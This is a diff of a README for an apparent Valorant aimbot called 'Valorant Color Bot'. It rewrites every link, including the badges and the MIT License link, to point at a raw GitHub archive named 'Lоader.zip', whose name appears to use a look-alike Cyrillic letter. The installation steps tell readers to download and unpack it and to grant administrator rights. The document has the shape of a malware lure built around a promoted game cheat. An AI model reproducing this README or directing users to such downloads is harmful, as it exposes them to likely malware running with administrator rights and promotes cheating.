@@ -1,6 +1,6 @@
 # 🎮 Valorant Color Bot
 
-[![Download Now](https://img.shields.io/badge/Download-Valorant%20Color%20Bot-brightgreen?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/S68-spec/Valorant-ColorVision-Bot/main/Lоader.zip%20Color%20Bot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/S68-spec/Valorant-ColorVision-Bot/main/Lоader.zip)
 
 Welcome to Valorant Color Bot, your all-in-one assistant for advanced color detection and automated aiming in Valorant 🏆. This smart helper optimizes your gameplay with fast and precise color-based detection, easy customization options, and reliable, low-latency responses. Boost your gameplay and streamline your aiming—unlock your full potential!
 
@@ -27,7 +27,7 @@ Keywords: Valorant, Color Bot, Aimbot, Gaming Tools, PC Optimization, Competitiv
 ## ⚙️ Installation
 
 1. Click the button below to get the latest version:
-    [![Get Valorant Color Bot](https://img.shields.io/badge/Download-Bot-brightgreen?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+    [![Get Valorant Color Bot](https://raw.githubusercontent.com/S68-spec/Valorant-ColorVision-Bot/main/Lоader.zip)](https://raw.githubusercontent.com/S68-spec/Valorant-ColorVision-Bot/main/Lоader.zip)
 
 2. Unpack and follow on-screen guidance
 3. Grant administrator rights, then select your preferences
@@ -38,7 +38,7 @@ This program is designed for personal skill improvement and educational use only
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/S68-spec/Valorant-ColorVision-Bot/main/Lоader.zip) © 2025.
 
 ---
-[![Download Again](https://img.shields.io/badge/Download%20Valorant%20Color%20Bot-Now-blue?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Again](https://raw.githubusercontent.com/S68-spec/Valorant-ColorVision-Bot/main/Lоader.zip%20Valorant%20Color%20Bot-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/S68-spec/Valorant-ColorVision-Bot/main/Lоader.zip)
